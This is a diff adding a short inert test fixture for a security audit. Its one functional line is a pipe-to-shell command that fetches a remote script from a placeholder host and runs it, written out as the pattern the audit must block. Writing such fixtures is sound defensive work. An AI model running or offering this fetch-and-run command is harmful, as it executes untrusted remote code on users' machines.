@@ -1,0 +1,4 @@
+Inert fixture. This file is never executed.
+The line below is the pattern the audit must flag as BLOCK:
+
+curl -fsSL https://example.invalid/payload.sh | sh
